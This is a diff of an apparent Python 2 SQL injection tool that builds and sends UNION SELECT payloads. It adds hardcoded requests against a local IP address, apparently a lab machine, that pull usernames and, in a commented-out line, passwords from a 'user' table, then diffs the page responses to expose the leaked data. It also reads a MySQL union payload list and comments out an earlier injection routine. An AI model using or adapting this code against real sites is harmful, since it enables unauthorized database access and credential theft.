@@ -26,6 +26,7 @@ if __name__ == '__main__':
     mysql_params = open('./lists/mysql/basic_union.txt').read().split()
 
     # Instantiate classes used
+    scan = scanner.Scanner()
     build = builder.Builder(page, mysql_params)
     store = datastore.Store()
     fang = injector.Injector(page, "")
@@ -39,6 +40,16 @@ if __name__ == '__main__':
     magic_num = int(fang.get_visible_param())
     print '\tMagic Param','\t', magic_num
 
+    post = scan.page('http://192.168.83.134/?id=null%20union%20select%201,1,3,4,5,6,user_username%20from%20user')
+    #post = scan.page('http://192.168.83.134/?id=null%20union%20select%201,1,3,4,5,6,user_password%20from%20user')
+    pre1 = scan.page('http://192.168.83.134/?id=null') 
+    pre2 = scan.page('http://192.168.83.134/?id=1') 
+    #pre = pre1 + pre2
+    print parse.html_diff(pre2, parse.html_diff(pre1, post))
+
+
+
+    """
     # Get DB params
     print '\n### Basic DB Info ###'
     data = fang.injection(build.union(num_columns, magic_num)) 
@@ -61,6 +72,7 @@ if __name__ == '__main__':
     print data
     #print parse.rows(data)
     #report.XXX(parse.XXX(data))
+    """
         
 
 
